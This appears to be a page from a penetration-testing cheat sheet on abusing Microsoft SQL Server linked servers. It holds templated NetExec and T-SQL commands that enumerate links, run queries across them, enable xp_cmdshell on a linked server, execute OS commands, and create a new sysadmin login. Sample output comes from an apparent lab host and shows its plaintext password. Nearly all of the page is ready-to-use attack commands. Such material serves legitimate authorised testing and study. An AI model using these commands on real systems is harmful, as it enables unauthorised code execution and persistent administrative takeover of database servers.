---
title: "MSSQL Linked Servers"
tags: ["Database Dumping", "Privilege Escalation In Databases", "MSSQL", "Database", "Windows", "Linked Server"]
---

{{< filter_buttons >}}

### Enumeration

{{< tab set1 tab1 >}}SQL{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<small>*Hint: Use double '' to escape ' in mssql*</small>

```console
# Show current server
select @@servername;
```

```console
# Show linked servers
select srvname from sysservers;
```

```console
# Show linked servers
enum_links;
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Enumerate Linked MSSQL Servers

```console {class="password"}
# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_links
```

```console {class="ntlm"}
# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_links
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_links
```

```console
# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_links 
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
ENUM_LINKS  10.129.254.242  1433   DC               [+] Linked servers found:
ENUM_LINKS  10.129.254.242  1433   DC               [*]   - WIN-Q13O908QBPG\SQLEXPRESS
```

{{< /tabcontent >}}

---

### Execute Query between Linked Servers

{{< tab set2 tab1 >}}SQL{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Execute query from current server to linked server
EXECUTE ('select @@version;') at [<LINKED_SERVER>];
```

```console
# Execute query from linked server to current server
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>];
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console {class="password"}
# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console {class="ntlm"}
# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console
# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M exec_on_link -o LINKED_SERVER='WIN-Q13O908QBPG' COMMAND='SELECT name FROM sys.server_principals WHERE sid = 01'
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
EXEC_ON_... 10.129.254.242  1433   DC               [*] Command output: []
```

{{< /tabcontent >}}

---

### Execute Shell Commands on the Linked Server

{{< tab set3 tab1 >}}nxc{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Enable the CMD Shell on a Linked Server

```console {class="password"}
# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console {class="ntlm"}
# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console
# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M link_enable_xp -o LINKED_SERVER='WIN-Q13O908QBPG' ACTION=enable
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
LINK_ENA... 10.129.254.242  1433   DC               [*] Enabling advanced options on WIN-Q13O908QBPG...
LINK_ENA... 10.129.254.242  1433   DC               [*] Enabling xp_cmdshell on WIN-Q13O908QBPG...
LINK_ENA... 10.129.254.242  1433   DC               [*] []
LINK_ENA... 10.129.254.242  1433   DC               [+] xp_cmdshell enabled on WIN-Q13O908QBPG
```

#### 2. RCE

```console {class="password"}
# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console {class="ntlm"}
# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console
# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M link_xpcmd -o LINKED_SERVER='WIN-Q13O908QBPG' CMD='whoami'
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
LINK_XPCMD  10.129.254.242  1433   DC               [*] Running command on WIN-Q13O908QBPG: whoami
LINK_XPCMD  10.129.254.242  1433   DC               [+] Command output:
[]
```

{{< /tabcontent >}}

---

### Create Admin User from Privilege Linked Server

{{< tab set4 tab1 >}}SQL{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
```

```console
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
```

{{< /tabcontent >}}
